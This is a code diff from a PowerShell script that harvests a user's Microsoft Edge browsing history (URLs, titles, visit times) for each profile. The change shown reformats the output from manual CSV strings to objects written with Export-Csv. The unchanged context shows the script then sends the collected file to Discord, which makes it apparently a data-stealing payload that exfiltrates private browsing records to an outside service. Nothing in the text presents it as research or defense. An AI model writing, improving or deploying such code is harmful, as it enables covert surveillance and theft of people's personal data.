@@ -80,15 +80,14 @@ foreach ($profile in $profiles) {
     "Edge Browsing History for user: $GetUser, Profile: $profileName (last $DaysBack days)" | Out-File -FilePath $tempFile
     "Source: $edgeHistoryPath" | Out-File -FilePath $tempFile -Append
     "" | Out-File -FilePath $tempFile -Append
-    "URL,Title,Visit Time" | Out-File -FilePath $tempFile -Append
 
-    # Parse and format history as CSV
+    # Parse and format history as objects
     $historyLines = $history -split "`n" | Where-Object { $_ -match '\|' }
-    foreach ($line in $historyLines) {
+    $data = foreach ($line in $historyLines) {
         $parts = $line -split '\|'
         if ($parts.Count -ge 3) {
-            $url = '"' + $parts[0].Trim().Replace('"', '""') + '"'
-            $title = '"' + $parts[1].Trim().Replace('"', '""') + '"'
+            $url = $parts[0].Trim()
+            $title = $parts[1].Trim()
             $visitTimeRaw = $parts[2].Trim()
             try {
                 $visitTime = [DateTime]::FromFileTimeUtc([long]$visitTimeRaw * 10)
@@ -96,9 +95,16 @@ foreach ($profile in $profiles) {
             } catch {
                 $visitTimeFormatted = $visitTimeRaw  # Fallback to raw if conversion fails
             }
-            "$url,$title,$visitTimeFormatted" | Out-File -FilePath $tempFile -Append
+            [PSCustomObject]@{
+                URL = $url
+                Title = $title
+                'Visit Time' = $visitTimeFormatted
+            }
         }
     }
+
+    # Export to CSV
+    $data | Export-Csv -Path $tempFile -NoTypeInformation -Append
 
     # Send the file to Discord using HttpClient for multipart
     try {
